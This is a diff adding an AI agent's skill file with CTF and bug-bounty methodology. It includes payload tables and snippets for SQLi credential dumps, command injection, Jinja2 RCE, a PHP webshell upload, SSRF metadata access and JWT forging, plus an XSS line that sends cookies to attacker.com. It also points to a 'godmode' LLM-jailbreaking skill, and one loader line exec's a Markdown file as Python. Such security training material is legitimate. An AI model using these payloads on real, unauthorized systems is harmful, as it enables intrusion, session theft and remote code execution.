@@ -1,0 +1,554 @@
+---
+name: bugbounty-ctf
+description: "Use when solving CTF challenges, practicing bug bounty hunting, analyzing vulnerabilities, writing exploit code, or performing authorized security assessments. Covers web vulns, crypto, pwn, reverse engineering, forensics, OSINT, and exploit development methodology."
+version: 3.0.0
+author: Hermes Agent
+license: MIT
+platforms: [linux, macos]
+metadata:
+  hermes:
+    tags: [ctf, bug-bounty, security, exploit, web-hacking, reverse-engineering, forensics, cryptography, pwn, osint, vulnerability-research]
+    related_skills: [godmode, systematic-debugging, codebase-inspection]
+---
+
+# Bug Bounty & CTF Skill
+
+Operational methodology for Capture The Flag challenges and authorized bug bounty hunting. **Black-box first** — discover vulnerabilities through testing, not by reading source code. Source code review is a separate discipline (`codebase-inspection`).
+
+## When to Use This Skill
+
+Trigger when the user:
+- Asks for help solving a CTF challenge (any category)
+- Wants to hunt bugs on a bug bounty program
+- Needs to analyze a binary, crack encryption, or decode obfuscated data
+- Wants to write exploit code (buffer overflow, ROP chain, shellcode)
+- Asks about vulnerability scanning, fuzzing, or recon methodology
+- Needs help with reverse engineering (Ghidra, radare2, IDA patterns)
+- Wants to analyze network captures, memory dumps, or disk images
+- Mentions specific vuln classes: SQLi, XSS, SSRF, RCE, LFI, IDOR, SSTI, XXE, deserialization
+
+**Don't use for:** LLM jailbreaking (use `godmode`), general code debugging (use `systematic-debugging`), or reading source code for bugs (use `codebase-inspection`).
+
+## Philosophy: Discover, Don't Read
+
+If source code is available, **you still test like you don't have it**. Reading `canonical_exploit()` or `mark_exploited()` isn't hacking — it's reading the answer key. The skill of a pentester is finding bugs through observation, testing, and analysis. Source code can confirm your findings afterward, but it should never replace the discovery process.
+
+## Quick Reference: CTF Categories
+
+| Category | What It Is | Key Skills |
+|:---------|:-----------|:-----------|
+| **Web** | Exploit web app vulnerabilities | HTTP, SQL, JS, deserialization, auth bypass |
+| **Crypto** | Break or abuse cryptographic systems | XOR, RSA, AES modes, padding oracle, ECC |
+| **Pwn** | Binary exploitation | Buffer overflows, ROP, format strings, heap |
+| **Rev** | Reverse engineer binaries | Disassembly, decompilation, crackme, unpacking |
+| **Forensics** | Extract hidden data from artifacts | PCAP, memory dumps, steganography, disk images |
+| **OSINT** | Open-source intelligence gathering | Google dorks, metadata, geolocation, social engineering |
+| **Misc** | Everything else | Programming puzzles, encoding, logic, trivia |
+
+## Step 0: Auto-Detect Challenge Type
+
+Before diving in, let the tooling tell you what you're dealing with:
+
+```python
+exec(open(os.path.join(os.environ.get("HERMES_HOME", os.path.expanduser("~/.hermes")),
+    "skills/red-teaming/bugbounty-ctf/references/ctf_helper.py")).read())
+
+result = analyze_challenge("/path/to/challenge_file")
+print(result["category"])       # "pwn/rev", "crypto", "forensics"
+print(result["suggestions"])    # Specific next steps
+print(result.get("found_flags")) # If flag is in strings!
+```
+
+This runs `file`, `strings`, pattern matching for flags/base64/hex, and extension-based heuristics. Always start here — it catches the easy flags hiding in plaintext.
+
+## Step 1: Web Exploitation — Black-Box Methodology
+
+### Phase 0: Load Testing Engine
+
+Before manual testing, load the automated security testing engine:
+
+```python
+# Load the core engine
+exec(open(os.path.join(os.environ.get("HERMES_HOME", os.path.expanduser("~/.hermes")),
+    "skills/red-teaming/bugbounty-ctf/scripts/security_engine.py")).read())
+
+# Load quick test wrappers
+exec(open(os.path.join(os.environ.get("HERMES_HOME", os.path.expanduser("~/.hermes")),
+    "skills/red-teaming/bugbounty-ctf/scripts/quick_test.py")).read())
+
+# Load payload library
+exec(open(os.path.join(os.environ.get("HERMES_HOME", os.path.expanduser("~/.hermes")),
+    "skills/red-teaming/bugbounty-ctf/references/payload-library.md")).read())
+```
+
+**Quick testing functions available after loading:**
+- `test_login_sqli(url)` — Test login form for SQL injection
+- `test_ssti(url, method, param_name)` — Test for SSTI
+- `test_command_injection(url, method, param_name)` — Test for command injection
+- `test_path_traversal(url, method, param_name)` — Test for path traversal
+- `test_nosqli(url)` — Test JSON login for NoSQL injection
+- `test_ldap_injection(url)` — Test for LDAP injection
+- `test_ssrf(url, method, param_name)` — Test for SSRF
+- `map_surface(base_url)` — Map attack surface (forms, links, tech)
+
+**Advanced functions (load `scripts/advanced_tests.py` for these):**
+- `detect_defenses(base_url)` — Fingerprint WAF, rate limit, input filters, missing security headers
+- `test_race_condition(url, data=..., workers=30)` — Concurrent request race testing with success counting
+- `test_xxe(url)` — XXE with multiple entity payloads (file://, php://filter, parameter entities)
+- `test_pickle_deserialization(url, param_name)` — Python pickle RCE probe (uses benign marker file, not real RCE)
+- `test_yaml_deserialization(url, param_name)` — PyYAML unsafe_load probe
+- `test_jwt_attacks(url, token)` — JWT alg=none, weak HS256 secret bruteforce
+- `decode_jwt(token)` / `forge_jwt_alg_none(payload)` / `forge_jwt_hs256(payload, secret)` — JWT utilities
+- `test_file_upload(url, file_field)` — Upload bypass variants (extension, magic bytes, double-ext, case)
+- `ChainContext()` — Carry tokens/credentials/findings across exploits; `.try_endpoints_with_token()` auto-tests captured tokens against admin endpoints
+- `generate_report(scanner)` / `save_report(scanner)` — Markdown or JSON severity-ranked reports
+
+**Loading the advanced module:**
+```python
+exec(open(os.path.join(os.environ.get("HERMES_HOME", os.path.expanduser("~/.hermes")),
+    "skills/red-teaming/bugbounty-ctf/scripts/advanced_tests.py")).read())
+```
+
+**Direct engine usage:**
+```python
+scanner = SecurityScanner("http://target/")
+
+# Test with custom payloads
+baseline = scanner.get_baseline("POST", "http://target/login", data={"user": "test"})
+results = scanner.run_payload_set(baseline, "POST", "http://target/login", 
+                                   {"sqli": "' OR 1=1--", "ssti": "{{7*7}}"}, "user")
+
+# Get findings
+print(scanner.get_summary())
+```
+
+### Phase 1: Reconnaissance (Map the surface)
+
+**1. Get every page.** Visit every URL you can find — the landing page, any linked pages, common paths.
+
+```python
+import requests
+
+base = "http://target/"
+# Start with the root page
+r = requests.get(base, timeout=5)
+# Extract all hrefs, form actions, script srcs
+import re
+hrefs = re.findall(r'href="([^"]*)"', r.text)
+actions = re.findall(r'action="([^"]*)"', r.text)
+scripts = re.findall(r'src="([^"]*)"', r.text)
+```
+
+**2. Check every endpoint.** For each discovered URL, try GET and POST. Note status codes, response lengths, content types.
+
+```python
+paths = ["/", "/login", "/api", "/admin", "/upload", "/profile", "/search"]
+for p in paths:
+    r = requests.get(base + p, timeout=5)
+    print(f"GET {p}: {r.status_code} len={len(r.text)} ct={r.headers.get('Content-Type')}")
+```
+
+**3. Extract every input point.** Every form field, every URL parameter, every header, every cookie is a potential vulnerability.
+
+```python
+# Find all form inputs
+inputs = re.findall(r'<input[^>]*name="([^"]*)"[^>]*>', r.text)
+textareas = re.findall(r'<textarea[^>]*name="([^"]*)"', r.text)
+# Find hidden fields too — they often hold important tokens
+hidden = re.findall(r'<input[^>]*type="hidden"[^>]*name="([^"]*)"[^>]*value="([^"]*)"', r.text)
+```
+
+**4. Technology fingerprinting.** Check response headers for server info, framework hints.
+
+```python
+for k, v in r.headers.items():
+    print(f"  {k}: {v}")
+# Key headers: Server, X-Powered-By, Set-Cookie format, Content-Type
+# Werkzeug = Flask/Python, nginx = possibly PHP, Tomcat = Java
+```
+
+### Phase 2: Vulnerability Testing (Test every input)
+
+Test in this order — highest ROI first:
+
+| # | Test | Payload | What to look for |
+|:--|:-----|:--------|:-----------------|
+| 1 | SQL Injection | `'`, `' OR 1=1--` | Error messages, different response length, auth bypass |
+| 2 | Command Injection | `; id`, `| id` | `uid=` in response, execution timing |
+| 3 | SSTI | `{{7*7}}` | `49` in rendered output |
+| 4 | Path Traversal | `../../../etc/passwd` | `root:` in response |
+| 5 | SSRF | `http://127.0.0.1` | Internal service responses, metadata access |
+| 6 | XSS | `<svg onload=alert(1)>` | Script execution, reflected input |
+| 7 | Auth Bypass | `' OR '1'='1`, `{"$ne":null}` | Login without valid credentials |
+| 8 | IDOR | Change user_id=1 → 2 → 42 | Other users' data accessible |
+| 9 | XXE | `<!DOCTYPE root [<!ENTITY x SYSTEM "file:///etc/passwd">]>` | File contents in response |
+| 10 | Deserialization | Pickled/Marshaled objects | Command execution |
+
+**For each input, always test:**
+- The baseline (normal input) — record status code, length, response time
+- A single quote `'` — triggers SQL/parse errors
+- Template syntax `{{7*7}}` — triggers SSTI
+- Path traversal `../../../etc/passwd` — triggers LFI
+- The payload — whatever makes sense for the input type
+
+**Compare every response to the baseline.** A different length, status code, or error message means you found something.
+
+### Phase 3: Exploitation Chain
+
+Once you find a vulnerability, use it to access more surface:
+- SQLi → dump credentials → login as admin
+- IDOR → find admin token → access admin endpoints
+- XSS → steal session → impersonate user
+- SSRF → access internal APIs → find more vulns
+- File upload → webshell → RCE
+
+### Automated Recon Script
+
+```python
+exec(open(os.path.join(os.environ.get("HERMES_HOME", os.path.expanduser("~/.hermes")),
+    "skills/red-teaming/bugbounty-ctf/scripts/web_recon.py")).read())
+
+result = recon_target("http://target.com", quick=True)
+print(recon_report(result))
+```
+
+### SQL Injection — Complete Workflow
+
+**Detection:**
+```python
+import requests
+
+url = "http://target/page"
+baseline = requests.get(url, params={"id": "1"}).text
+
+payloads = ["'", "' OR 1=1--", "' OR '1'='1", "1' ORDER BY 5--"]
+for p in payloads:
+    r = requests.get(url, params={"id": p})
+    if r.text != baseline:
+        print(f"[!] DIFFERENT RESPONSE: {p} → status {r.status_code}, len {len(r.text)}")
+```
+
+**Exploitation (SQLite):**
+```sql
+' UNION SELECT tbl_name,2,3 FROM sqlite_master WHERE type='table'--
+' UNION SELECT sql,2,3 FROM sqlite_master WHERE type='table'--
+' UNION SELECT username,password,3 FROM users--
+```
+
+**Exploitation (MySQL):**
+```sql
+' UNION SELECT table_name,2,3 FROM information_schema.tables WHERE table_schema=database()--
+' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT username,password,3 FROM users--
+```
+
+### XSS — Filter Bypass Escalation
+
+| Level | Payload | Bypasses |
+|:------|:--------|:---------|
+| 1 | `<script>alert(1)</script>` | Nothing filtered |
+| 2 | `<svg onload=alert(1)>` | `<script>` blocked |
+| 3 | `<details open ontoggle=alert(1)>` | Common tags blocked |
+| 4 | `<img src=x onerror="fetch('//attacker.com/'+document.cookie)">` | alert() blocked |
+
+**DOM XSS:** Find sources → sinks:
+- Sources: `location.hash`, `location.search`, `document.URL`, `document.referrer`
+- Sinks: `eval()`, `setTimeout()`, `innerHTML`, `document.write()`, `jQuery.html()`
+
+### SSRF — Cloud Metadata Targets
+
+```bash
+curl http://169.254.169.254/latest/meta-data/
+curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/
+```
+
+**Bypassing localhost filters:** `0177.0.0.1` (octal), `2130706433` (decimal), `[::ffff:127.0.0.1]` (IPv6)
+
+### SSTI — Engine Detection
+
+```
+{{7*7}}     → 49 = Jinja2, Twig, Freemarker
+${7*7}      → 49 = Freemarker, Spring EL
+<%= 7*7 %>  → 49 = ERB (Ruby)
+```
+
+**Jinja2 RCE:** `{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}`
+
+### Command Injection — Payload Arsenal
+
+**Basic:** `; id`, `| id`, `&& id`, `` `id` ``, `$(id)`
+
+**No spaces:** `cat${IFS}/etc/passwd`, `{cat,/etc/passwd}`
+
+### JWT Attacks
+
+```python
+import jwt
+
+# 1. Decode without verification
+payload = jwt.decode(token, options={"verify_signature": False})
+
+# 2. Try alg=none
+new_token = jwt.encode(payload, '', algorithm='none')
+
+# 3. RS256 → HS256 (public key as HMAC secret)
+new_token = jwt.encode(payload, public_key, algorithm='HS256')
+
+# 4. Modify claims
+payload["role"] = "admin"
+```
+
+### NoSQL Injection (MongoDB)
+
+**Auth bypass** — send objects instead of strings:
+```json
+{"username": {"$ne": null}, "password": {"$ne": null}}
+```
+
+### LDAP Injection
+
+**Wildcard bypass:**
+```
+username: *
+password: *
+```
+Filter becomes `(&(uid=*)(userPassword=*))` — matches every entry.
+
+### SAML XML Signature Wrapping (XSW)
+
+Wrap a legitimate SAML response in a new forged assertion:
+```xml
+<samlp:Response>
+  <saml:Assertion ID="_attacker">
+    <saml:Subject><saml:NameID>admin</saml:NameID></saml:Subject>
+    <saml:Attribute Name="role"><saml:AttributeValue>admin</saml:AttributeValue></saml:Attribute>
+  </saml:Assertion>
+  {original_signed_assertion}
+</samlp:Response>
+```
+
+### GraphQL Alias Batch
+
+Parallelize brute-force in a single request:
+```graphql
+mutation { m0: login(pin:"0000"){success} m1: login(pin:"1337"){success} }
+```
+
+### Race Conditions
+
+Use concurrent requests with session pooling:
+```python
+import concurrent.futures, requests
+session = requests.Session()
+def exploit():
+    return session.post(url, data=payload, timeout=5)
+with concurrent.futures.ThreadPoolExecutor(max_workers=50) as ex:
+    results = list(ex.map(lambda _: exploit(), range(50)))
+# If multiple successes on a single-use operation, race condition confirmed
+```
+
+### File Upload Bypass
+
+| Filter | Bypass |
+|:-------|:-------|
+| Extension blacklist | `.php3`, `.phtml`, `.phar` |
+| Content-Type check | Upload PHP with `Content-Type: image/jpeg` |
+| Magic bytes | `GIF89a;<?php system($_GET['c']); ?>` |
+
+### Cache Poisoning
+
+```
+GET /api/config
+X-Forwarded-Host: evil.com
+```
+If the response reflects `evil.com` in URLs, the cache may serve poisoned responses to other users.
+
+### Host Header Injection
+
+```
+POST /forgot-password
+Host: attacker.com
+email=victim@example.com
+```
+Password reset links may use `request.host_url` — attacker controls the redirect target.
+
+### Log Poisoning → SSTI Chain
+
+Inject template syntax into logged fields (User-Agent, referer, custom headers), then trigger template rendering on the log view endpoint:
+```
+GET /visit → User-Agent: {{7*7}}
+GET /render → check if "49" appears in rendered output
+```
+
+## Step 2: Cryptography
+
+### Auto-Decoding Workflow
+
+```python
+exec(open(os.path.join(os.environ.get("HERMES_HOME", os.path.expanduser("~/.hermes")),
+    "skills/red-teaming/bugbounty-ctf/references/ctf_helper.py")).read())
+
+result = decode_all_encodings("dGVzdCBmbGFnIHtmbGFnX3Rlc3R9")
+print(result["flag_matches"])
+```
+
+### RSA Attack Decision Tree
+
+```
+Given: n, e, c
+
+1. e very small (e=3)? → Cube root if m^e < n
+2. Same n, different e? → Common modulus attack
+3. e very large? → Wiener's attack (small d)
+4. p and q close? → Fermat factorization
+5. Can factor n? → d = inverse(e, (p-1)*(q-1))
+```
+
+## Step 3: Binary Exploitation (Pwn)
+
+### Protection Check First
+
+```bash
+checksec ./vuln
+```
+
+| Protection | Bypass |
+|:-----------|:-------|
+| NX/DEP | ROP, return-to-libc |
+| PIE | Leak address first, calculate base |
+| Canary | Leak via format string/info leak |
+
+### Buffer Overflow
+
+```python
+from pwn import *
+context.arch = 'amd64'
+io = process('./vuln')
+io.sendline(cyclic(200))
+io.wait()
+offset = cyclic_find(0x6161616c)  # from crash
+payload = b'A' * offset + p64(RET_ADDRESS)
+io = process('./vuln')
+io.sendline(payload)
+io.interactive()
+```
+
+## Step 4: Reverse Engineering
+
+```bash
+file binary
+strings binary | head -50
+checksec binary
+ltrace binary 2>&1 | head -20
+strace binary 2>&1 | head -20
+echo "test" | ltrace binary
+```
+
+**Always run the binary first** before opening a disassembler. Observe behavior, then analyze.
+
+## Step 5: Forensics
+
+Run in order — ~40% of flags are caught by step 1:
+
+```bash
+strings image.png | grep -iE "flag|ctf|key|secret"
+exiftool image.png
+binwalk -e image.png
+zsteg image.png -a
+steghide extract -sf image.png -p ""
+```
+
+## CTF Identification vs Flag-Capture
+
+Many CTF labs are **vulnerability identification exercises**, not flag-capture:
+- Challenge asks "Check if X is secure" not "Find the flag"
+- No flag format specified
+- The answer is the vulnerability type itself
+- The platform has a submission form for vuln names/CWE codes
+
+**Self-XSS detection:** DOM XSS with no delivery vector (no bot, no shareable URL) — the XSS itself is the answer. Don't chase account-takeover chains that don't exist.
+
+## Bug Bounty Methodology
+
+1. **Scope check:** Only test in-scope domains.
+2. **Surface mapping:** Every input point — params, headers, cookies, uploads, API endpoints.
+3. **Vulnerability testing:** Follow the order in Step 1.
+4. **Impact demonstration:** Show real impact — data access, account takeover, RCE.
+5. **Report writing:** Clear steps, PoC, impact, fix.
+6. **Responsible disclosure:** Report through proper channels.
+
+## Common Pitfalls
+
+### Web
+
+1. **Web payload encoding:** URL-encode special chars in GET params.
+2. **Forgetting to reset connections:** State from stage 1 can break stage 2.
+3. **Self-XSS detection pattern:** DOM XSS with no remote delivery = self-XSS. Indicators: (a) JS only reads form input. (b) No bot/admin visits. (c) SQLi output is HTML-escaped. (d) No POST accepts user content.
+4. **PHP dev server (`php -S`) routes everything to `index.php`:** Gobuster shows hundreds of `200 OK` with identical sizes. Use `--exclude-length` to filter.
+5. **WordPress comments go to moderation.** 302 redirect with `unapproved=N` — comment won't appear until approved.
+
+### Pwn / Binary
+
+6. **Off-by-one in offsets:** Always verify with `cyclic_find()`, never guess.
+7. **Stack alignment:** x86_64 requires 16-byte alignment before `call`. Add `ret` gadget.
+8. **Wrong architecture:** `context.arch = 'i386'` for 32-bit, `'amd64'` for 64-bit.
+9. **pwntools recv hangs:** Use `recv(timeout=2)` when unsure.
+
+### Crypto
+
+10. **Big-endian vs little-endian:** Network = big-endian, x86 = little-endian.
+11. **Multi-byte XOR:** Use Hamming distance to find key length.
+
+### Privilege Escalation
+
+12. **SUID interactive binaries need PTY.** Use `pty.openpty()` + fork + execve.
+13. **`sg` / `newgrp` need a TTY.** Combine with `pty.openpty()`.
+
+### Forensics
+
+14. **Skip the obvious last:** Run `strings`, `exiftool`, `binwalk` BEFORE complex tools.
+
+### CTF Workflow
+
+15. **Read the challenge description.** Hints are embedded in descriptions and file names.
+16. **Challenge descriptions use metaphors.** "forgotten rusty key" = old cache file; "drop of frost" = IV; "master key" = AES key. Map poetic language to technical concepts.
+17. **CTF rate limiting is per-session-cookie.** Rotate cookies between batches or wait the cooldown.
+18. **If a route returns 404, the variation may not be loaded.** In dynamically-generated labs (DRTBP/Agenticverse), some challenge variations require specific config. Don't waste time on endpoints that don't exist.
+19. **WSGI-only exploits.** Some challenges require Flask test client `environ_overrides` — these are **not exploitable via standard HTTP requests**. Skip and move on.
+
+## Verification Checklist
+
+- [ ] Map all endpoints (GET + POST every URL)
+- [ ] Extract all input points (forms, params, headers, cookies)
+- [ ] Establish baselines (normal response for each input)
+- [ ] Test each input with `'`, `{{7*7}}`, `../../../etc/passwd`, `; id`
+- [ ] Compare every response to baseline — differences = vulns
+- [ ] Exploit confirmed vulns, chain to new surface
+- [ ] Only test on authorized targets
+
+## Reference Index
+
+| File | Use when |
+|:-----|:---------|
+| `scripts/security_engine.py` | Core testing engine: payload runner, response diff, attack surface mapping, state persistence |
+| `scripts/quick_test.py` | Quick test wrappers: one-liners for SQLi, SSTI, CMDi, path traversal, NoSQLi, LDAP, SSRF |
+| `scripts/advanced_tests.py` | Advanced: WAF/defense detection, race conditions, XXE, deserialization, JWT, file upload, chain exploitation, reporting |
+| `references/payload-library.md` | Organized payload sets by vulnerability class with Python dicts |
+| `references/escalate-ctf-walkthrough.md` | Full SQLi → webshell → SUID → docker root chain |
+| `references/advanced-escalation.md` | SUID PTY, PAM scripts, Docker escapes |
+| `references/suid-webshell-exploitation.md` | SUID binaries via webshell, Python pty patterns |
+| `references/suid-sg-docker-escalation.md` | `setresuid()` + `sg docker` pattern |
+| `references/docker-privilege-escalation.md` | Docker group → root, comprehensive |
+| `references/curl-executor-webshell.md` | SSRF curl executor → webshell → RCE |
+| `references/sqlite-php-sqli-playbook.md` | PHP+SQLite SQLi attack tree |
+| `references/sqlite-sqli-deep-dive.md` | pragma_*, sqlite_dbpage, FTS3 tokenizer |
+| `references/htb-recon-methodology.md` | HTB recon: machine ID, GitHub source discovery |
+| `references/aclabs-platform-patterns.md` | ACLabs.pro patterns, vuln-ID vs flag-capture |
+| `references/nginx-ui-exploitation.md` | nginx-ui: unauthenticated backup, RSA login |
+| `references/nginx-ui-login-encryption.md` | nginx-ui RSA login workflow |
+| `references/recreating-ctf-labs-locally.md` | Rebuild CTF target as Docker Compose |
+| `templates/exploit_template.py` | Pwntools exploit skeleton |
+| `templates/bug-bounty-report.md` | Report template for bounty submissions |
+| `scripts/web_recon.py` | Automated web target recon |
+| `scripts/callback_listener.py` | HTTP listener for XSS/SSRF callback testing |
+| `references/ctf_helper.py` | `analyze_challenge()`, encoding detection, XOR, hash cracking |
